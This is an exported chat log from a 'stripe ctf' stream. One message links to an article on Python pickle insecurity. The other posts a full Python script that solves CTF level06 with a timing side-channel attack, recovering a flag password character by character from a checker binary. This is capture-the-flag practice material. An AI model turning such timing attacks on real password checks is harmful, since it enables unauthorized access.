{
    "anchor": 6946455,
    "found_anchor": true,
    "found_newest": true,
    "found_oldest": false,
    "history_limited": false,
    "messages": [
        {
            "avatar_url": "https://secure.gravatar.com/avatar/727381701627014419ca0b85a84c6ae7?d=identicon&version=1",
            "client": "website",
            "content": "<p><a href=\"http://michael-rushanan.blogspot.com/2012/10/why-python-pickle-is-insecure.html\" target=\"_blank\" title=\"http://michael-rushanan.blogspot.com/2012/10/why-python-pickle-is-insecure.html\">http://michael-rushanan.blogspot.com/2012/10/why-python-pickle-is-insecure.html</a></p>",
            "content_type": "text/html",
            "display_recipient": "stripe ctf",
            "flags": [
                "read",
                "historical"
            ],
            "id": 6781515,
            "is_me_message": false,
            "reactions": [],
            "recipient_id": 22759,
            "sender_email": "paolo.moretti85@gmail.com",
            "sender_full_name": "Paolo Moretti (S'13)",
            "sender_id": 2114,
            "sender_realm_str": "recurse",
            "stream_id": 20352,
            "subject": "(no subject)",
            "submessages": [],
            "timestamp": 1371077105,
            "topic_links": [],
            "type": "stream"
        },
        {
            "avatar_url": "https://secure.gravatar.com/avatar/727381701627014419ca0b85a84c6ae7?d=identicon&version=1",
            "client": "website",
            "content": "<div class=\"codehilite\"><pre><span class=\"c\">#!/usr/bin/env python</span>\n<span class=\"kn\">import</span> <span class=\"nn\">collections</span>\n<span class=\"kn\">import</span> <span class=\"nn\">operator</span>\n<span class=\"kn\">import</span> <span class=\"nn\">subprocess</span>\n<span class=\"kn\">import</span> <span class=\"nn\">string</span>\n<span class=\"kn\">import</span> <span class=\"nn\">time</span>\n\n<span class=\"n\">PROC</span> <span class=\"o\">=</span> <span class=\"s\">&#39;/levels/level06&#39;</span>\n<span class=\"n\">PWD_FILE</span> <span class=\"o\">=</span> <span class=\"s\">&#39;/home/the-flag/.password&#39;</span>\n\n<span class=\"n\">CHARS</span> <span class=\"o\">=</span> <span class=\"n\">string</span><span class=\"o\">.</span><span class=\"n\">letters</span> <span class=\"o\">+</span> <span class=\"n\">string</span><span class=\"o\">.</span><span class=\"n\">digits</span>\n\n<span class=\"k\">def</span> <span class=\"nf\">get_time</span><span class=\"p\">(</span><span class=\"n\">pwd</span><span class=\"p\">):</span>\n    <span class=\"n\">pwd</span> <span class=\"o\">=</span> <span class=\"n\">pwd</span> <span class=\"o\">+</span> <span class=\"s\">&#39;$&#39;</span>\n    <span class=\"n\">process</span> <span class=\"o\">=</span> <span class=\"n\">subprocess</span><span class=\"o\">.</span><span class=\"n\">Popen</span><span class=\"p\">(</span>\n        <span class=\"p\">(</span><span class=\"n\">PROC</span><span class=\"p\">,</span> <span class=\"n\">PWD_FILE</span><span class=\"p\">,</span> <span class=\"n\">pwd</span><span class=\"p\">),</span> <span class=\"n\">stdout</span><span class=\"o\">=</span><span class=\"n\">subprocess</span><span class=\"o\">.</span><span class=\"n\">PIPE</span><span class=\"p\">,</span> <span class=\"n\">stderr</span><span class=\"o\">=</span><span class=\"n\">subprocess</span><span class=\"o\">.</span><span class=\"n\">PIPE</span><span class=\"p\">)</span>\n\n    <span class=\"n\">total_microseconds</span> <span class=\"o\">=</span> <span class=\"mi\">0</span>\n\n    <span class=\"k\">while</span> <span class=\"bp\">True</span><span class=\"p\">:</span>\n        <span class=\"n\">start_time</span> <span class=\"o\">=</span> <span class=\"n\">time</span><span class=\"o\">.</span><span class=\"n\">time</span><span class=\"p\">()</span>\n        <span class=\"n\">char</span> <span class=\"o\">=</span> <span class=\"n\">process</span><span class=\"o\">.</span><span class=\"n\">stderr</span><span class=\"o\">.</span><span class=\"n\">read</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">)</span>\n        <span class=\"n\">elapsed_time</span> <span class=\"o\">=</span> <span class=\"n\">time</span><span class=\"o\">.</span><span class=\"n\">time</span><span class=\"p\">()</span> <span class=\"o\">-</span> <span class=\"n\">start_time</span>\n        <span class=\"n\">elapsed_microseconds</span> <span class=\"o\">=</span> <span class=\"nb\">round</span><span class=\"p\">(</span><span class=\"n\">elapsed_time</span> <span class=\"o\">*</span> <span class=\"mi\">10</span><span class=\"o\">**</span><span class=\"mi\">6</span><span class=\"p\">)</span>\n\n        <span class=\"k\">if</span> <span class=\"n\">char</span> <span class=\"o\">==</span> <span class=\"s\">&#39;&#39;</span><span class=\"p\">:</span> <span class=\"c\">#and process.poll() is None:</span>\n            <span class=\"k\">break</span>\n        <span class=\"k\">if</span> <span class=\"n\">char</span> <span class=\"o\">==</span> <span class=\"s\">&#39;.&#39;</span><span class=\"p\">:</span>\n            <span class=\"n\">total_microseconds</span>  <span class=\"o\">+=</span> <span class=\"n\">elapsed_microseconds</span>\n\n    <span class=\"k\">return</span> <span class=\"n\">total_microseconds</span>\n\n<span class=\"k\">def</span> <span class=\"nf\">is_password_correct</span><span class=\"p\">(</span><span class=\"n\">pwd</span><span class=\"p\">):</span>\n    <span class=\"n\">process</span> <span class=\"o\">=</span> <span class=\"n\">subprocess</span><span class=\"o\">.</span><span class=\"n\">Popen</span><span class=\"p\">(</span>\n        <span class=\"p\">(</span><span class=\"n\">PROC</span><span class=\"p\">,</span> <span class=\"n\">PWD_FILE</span><span class=\"p\">,</span> <span class=\"n\">pwd</span><span class=\"p\">),</span> <span class=\"n\">stdout</span><span class=\"o\">=</span><span class=\"n\">subprocess</span><span class=\"o\">.</span><span class=\"n\">PIPE</span><span class=\"p\">,</span> <span class=\"n\">stderr</span><span class=\"o\">=</span><span class=\"n\">subprocess</span><span class=\"o\">.</span><span class=\"n\">PIPE</span><span class=\"p\">)</span>\n\n    <span class=\"n\">stdout</span><span class=\"p\">,</span> <span class=\"n\">_</span> <span class=\"o\">=</span> <span class=\"n\">process</span><span class=\"o\">.</span><span class=\"n\">communicate</span><span class=\"p\">(</span><span class=\"nb\">input</span><span class=\"o\">=</span><span class=\"s\">&#39;</span><span class=\"se\">\\n</span><span class=\"s\">&#39;</span><span class=\"p\">)</span>\n\n    <span class=\"k\">return</span> <span class=\"s\">&quot;Ha ha, your password is incorrect&quot;</span> <span class=\"ow\">not</span> <span class=\"ow\">in</span> <span class=\"n\">stdout</span>\n\n<span class=\"k\">def</span> <span class=\"nf\">guess_password</span><span class=\"p\">(</span><span class=\"n\">pwd</span><span class=\"p\">,</span> <span class=\"n\">ntries</span><span class=\"p\">):</span>\n    <span class=\"n\">guesses</span> <span class=\"o\">=</span> <span class=\"n\">collections</span><span class=\"o\">.</span><span class=\"n\">defaultdict</span><span class=\"p\">(</span><span class=\"nb\">int</span><span class=\"p\">)</span>\n\n    <span class=\"k\">for</span> <span class=\"n\">_</span> <span class=\"ow\">in</span> <span class=\"nb\">xrange</span><span class=\"p\">(</span><span class=\"n\">ntries</span><span class=\"p\">):</span>\n        <span class=\"n\">guess</span><span class=\"p\">,</span> <span class=\"n\">time</span> <span class=\"o\">=</span>  <span class=\"nb\">min</span><span class=\"p\">(</span>\n            <span class=\"p\">((</span><span class=\"n\">pwd</span> <span class=\"o\">+</span> <span class=\"n\">char</span><span class=\"p\">,</span> <span class=\"n\">get_time</span><span class=\"p\">(</span><span class=\"n\">pwd</span> <span class=\"o\">+</span> <span class=\"n\">char</span><span class=\"p\">))</span> <span class=\"k\">for</span> <span class=\"n\">char</span> <span class=\"ow\">in</span> <span class=\"n\">CHARS</span><span class=\"p\">),</span>\n            <span class=\"n\">key</span><span class=\"o\">=</span><span class=\"n\">operator</span><span class=\"o\">.</span><span class=\"n\">itemgetter</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">))</span>\n\n        <span class=\"n\">guesses</span><span class=\"p\">[</span><span class=\"n\">guess</span><span class=\"p\">]</span> <span class=\"o\">+=</span> <span class=\"mi\">1</span>\n\n    <span class=\"c\">#print guesses</span>\n    <span class=\"n\">pwd</span><span class=\"p\">,</span> <span class=\"n\">n</span> <span class=\"o\">=</span> <span class=\"nb\">max</span><span class=\"p\">(</span><span class=\"n\">guesses</span><span class=\"o\">.</span><span class=\"n\">iteritems</span><span class=\"p\">(),</span> <span class=\"n\">key</span><span class=\"o\">=</span><span class=\"n\">operator</span><span class=\"o\">.</span><span class=\"n\">itemgetter</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">))</span>\n\n    <span class=\"k\">return</span> <span class=\"n\">pwd</span> <span class=\"k\">if</span> <span class=\"n\">is_password_correct</span><span class=\"p\">(</span><span class=\"n\">pwd</span><span class=\"p\">)</span> <span class=\"k\">else</span> <span class=\"n\">guess_password</span><span class=\"p\">(</span><span class=\"n\">pwd</span><span class=\"p\">,</span> <span class=\"n\">ntries</span><span class=\"p\">)</span>\n\n<span class=\"k\">def</span> <span class=\"nf\">main</span><span class=\"p\">():</span>\n    <span class=\"n\">pwd</span> <span class=\"o\">=</span> <span class=\"s\">&#39;&#39;</span>\n    <span class=\"k\">print</span> <span class=\"n\">guess_password</span><span class=\"p\">(</span><span class=\"n\">pwd</span><span class=\"p\">,</span> <span class=\"mi\">50</span><span class=\"p\">)</span>\n\n<span class=\"k\">if</span> <span class=\"n\">__name__</span> <span class=\"o\">==</span> <span class=\"s\">&#39;__main__&#39;</span><span class=\"p\">:</span>\n    <span class=\"n\">main</span><span class=\"p\">()</span>\n</pre></div>",
            "content_type": "text/html",
            "display_recipient": "stripe ctf",
            "flags": [
                "read",
                "historical"
            ],
            "id": 6946455,
            "is_me_message": false,
            "reactions": [],
            "recipient_id": 22759,
            "sender_email": "paolo.moretti85@gmail.com",
            "sender_full_name": "Paolo Moretti (S'13)",
            "sender_id": 2114,
            "sender_realm_str": "recurse",
            "stream_id": 20352,
            "subject": "(no subject)",
            "submessages": [],
            "timestamp": 1371488344,
            "topic_links": [],
            "type": "stream"
        }
    ],
    "msg": "",
    "result": "success"
}
